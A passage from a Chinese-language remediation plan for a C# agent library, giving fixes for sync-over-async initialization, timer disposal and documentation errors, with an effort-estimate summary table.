**更彻底的方案 — 使用 `AsyncLazy` 延迟初始化：**

```csharp
// 新建 Helper 文件
public static class AsyncHelper
{
    private static readonly TaskFactory _taskFactory = new(
        CancellationToken.None,
        TaskCreationOptions.None,
        TaskContinuationOptions.None,
        TaskScheduler.Default);

    public static TResult RunSync<TResult>(Func<Task<TResult>> func)
    {
        return _taskFactory.StartNew(func).Unwrap().GetAwaiter().GetResult();
    }

    public static void RunSync(Func<Task> func)
    {
        _taskFactory.StartNew(func).Unwrap().GetAwaiter().GetResult();
    }
}
```

**修复必要性: 🟡 强烈建议**
- **风险等级:** 中-高（在特定 SynchronizationContext 下死锁）
- **修复成本:** 中（需要重构初始化逻辑，或者使用 `Task.Run` 保底）
- **当前实际风险:** 降低，因为已包裹 `Task.Run`

---

### P0-21: AgentManager 构造函数中 `.Wait()` / `.Result`

**文件:** `src/Seeing.Agent/Configuration/AgentManager.cs:69, 74, 80`

**修复方案:**

将初始化逻辑从构造函数移到独立的生命周期方法：

```csharp
// AgentManager 中
// 构造函数只做同步初始化
public AgentManager(
    ILogger<AgentManager> logger,
    IAgentStore agentStore,
    /* ... */)
{
    _logger = logger;
    _agentStore = agentStore;
    // ... 赋值其他字段
    // 不再调用任何异步操作
}

// 添加初始化方法（实现 IHostedService 的理想方式）
public async Task InitializeAsync()
{
    _logger.LogInformation("AgentManager 开始初始化");
    var agentCount = await _agentStore.GetAllAsync();
    var agentCountResult = agentCount.Count;
    _logger.LogInformation("AgentManager 初始化完成，已注册 {Count} 个 Agent", agentCountResult);
}

// 如果必须配合 HostedService:
// public Task StartAsync(CancellationToken ct) => InitializeAsync();
```

**修复必要性: 🟢 必须修复**
- **修复成本:** 低（重构初始化流程）
- **回归风险:** 中（需确保所有调用方在初始化完成后才使用 AgentManager）

---

### P0-22: McpBackgroundReconnector Timer 无 IDisposable

**文件:** `src/Seeing.Agent/MCP/Management/McpBackgroundReconnector.cs:12`

**修复方案:**

```csharp
internal sealed class McpBackgroundReconnector : IDisposable
{
    private Timer? _timer;
    private bool _disposed;

    // ... 现有方法 ...

    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;

        _timer?.Change(Timeout.Infinite, Timeout.Infinite);
        _timer?.Dispose();
        _timer = null;
    }

    // 或者在现有 Stop() 方法中调用
    public void Stop()
    {
        _timer?.Change(Timeout.Infinite, Timeout.Infinite);
    }
}
```

**修复必要性: 🟢 必须修复**
- **修复成本:** 极低

---

### P0-23、P0-24: ToolManager 和 McpConnectionCoordinator 中 `Task.Run().GetAwaiter().GetResult()`

**修复方案:**

使用上一项提到的 `AsyncHelper.RunSync()` 模式统一替换，或者（更彻底地）提供真正的同步 API。

**修复必要性: 🟡 强烈建议**
- 当前已有 `Task.Run` 降低风险，但理想状态是消除所有 sync-over-async

---

## 🔴 文档（3 项）

---

### P0-25: AGENTS.md 文件数量不实

**修复方案:**

更新 AGENTS.md：

```markdown
| src/Seeing.Agent/              | 主 NuGet 库（**276** 个 C# 文件） |
| src/Seeing.Session/            | 独立会话管理包（**46** 个文件）     |
| tests/Seeing.Agent.Tests/      | 单元测试（**65** 个文件）          |
```

**修复必要性: 🟢 必须修复**
- **修复成本:** 极低

---

### P0-26: DI 生命周期表错误

**修复方案:**

更新 AGENTS.md（如决策为保持 Singleton）：

```markdown
| SessionManager, AgentExecutor | Singleton |
```

**修复必要性: 🟢 必须修复**（配合 P0-14/P0-15 决策）

---

### P0-27: 主库无 README.md

**修复方案:**

创建 `src/Seeing.Agent/README.md`，包含快速开始指南、核心 API 示例和依赖关系。

**修复必要性: 🟢 必须修复**（NuGet 包信息页需要）
- **修复成本:** 低（约 100 行 Markdown）

---

## 📊 汇总

| 分类 | P0 数 | 必须修复 | 强烈建议 | 有条件修复 | 预计工时 |
|------|-------|---------|---------|-----------|---------|
| 安全性 | 5 | 5 | 0 | 0 | 1.5 天 |
| 并发安全 | 8 | 8 | 0 | 0 | 1 天 |
| DI 生命周期 | 2 | 2 | 0 | 0 | 1 天 |
| 接口设计 | 1 | 0 | 0 | 1 | 0.5 天 |
| 错误处理 | 8 | 5 | 3 | 0 | 1 天 |
| 文档 | 3 | 3 | 0 | 0 | 0.2 天 |
| **总计** | **28** | **23** | **3** | **1** | **~5 天** |

> **下一篇：** P1 问题逐个修复方案
